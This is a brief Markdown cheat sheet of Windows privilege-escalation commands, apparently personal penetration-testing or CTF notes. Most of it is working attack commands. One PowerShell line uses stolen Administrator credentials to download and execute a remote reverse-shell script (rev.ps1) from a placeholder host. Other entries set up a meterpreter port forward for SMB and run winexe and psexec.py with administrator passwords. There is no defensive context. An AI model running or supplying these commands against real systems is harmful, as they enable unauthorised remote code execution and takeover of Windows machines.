# windows privesc

## powershell

Execute command as different user if you have the password

```ssh
$SecPass = ConvertTo-SecureString 'password' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('Administrator', $SecPass)

Start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.WebClient).downloadString('http://xxx.xxx.xxx:8000/rev.ps1')" -Credential $cred  
```

##  msf meterpreter portfwd
 
You can port potforward in meterpreter.
This tunnel 445 to your host so you can use psexec for privesc.
 
```ssh
portfwd add -l 445 -p 445 -r 127.0.0.1
```

Execute command

```
winexe -U administrator%password //127.0.0.1 cmd
psexec.py 'administrator:password@127.0.0.1' cmd
```
